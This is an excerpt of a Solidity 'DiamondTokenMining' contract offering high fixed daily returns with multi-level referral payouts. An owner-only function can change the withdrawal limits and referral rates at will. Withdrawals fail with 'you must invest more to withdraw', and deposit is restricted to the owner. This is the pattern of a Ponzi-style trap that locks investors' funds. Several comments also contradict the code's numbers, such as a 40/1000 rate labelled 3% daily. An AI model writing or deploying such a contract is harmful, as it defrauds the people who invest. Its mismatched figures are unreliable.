...
contract DiamondTokenMining {
	using SafeMath for uint256;
	using SafeERC20 for IERC20;
    
    // IERC20 public token = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); //BUSD MAINNET
    IERC20 public token = IERC20(0xea536C17315B8836195052Dd8dBa4040ECDC7c65); // DIAMOND TESTNET

	uint256 public INVEST_MIN_AMOUNT = 1000000000 ether; // 1000000000 TOKEN
	uint256[] public REFERRAL_PERCENTS = [120, 50, 30]; // 12,5,3
	uint256 constant public DEV_FEE = 20; //2%
	uint256 constant public PERCENTS_DIVIDER = 1000; 
	uint256 constant public TIME_STEP = 1 days;
    
    /*! anti-whale */
    uint256 public MAX_WITHDRAW = 10000000000 ether; // 1000000000 TOKEN MAX
    uint256 public limit = 1000000000 ether;
	...
	constructor(address payable wallet) {
        ...
        plans.push(Plan(180, 40)); // 180 days 3% daily // 540%
        plans.push(Plan(90, 40)); // 90 days 3.4% daily // 306%
        plans.push(Plan(60, 35)); // 60 days 4% daily // 180%
        plans.push(Plan(30, 30)); // 30 days 8% daily // 120%
	}
    ...
    function setting(uint64 min_investment, uint64 Max_withdraw, uint64 w_limit, uint64 ref1, uint64 ref2, uint64 ref3) public owner {
                                 
                             INVEST_MIN_AMOUNT = min_investment ;
                             MAX_WITHDRAW = Max_withdraw ;
                             limit = w_limit ;
                             REFERRAL_PERCENTS[0] = ref1 ;
                             REFERRAL_PERCENTS[1] = ref2 ;
                             REFERRAL_PERCENTS[2] = ref3;                
                            }
	...
	function withdraw() public {
        ...
        require(totalAmount < limit, "you must invest more to withdraw");
    ...
    function deposit(uint256 amount) public owner {
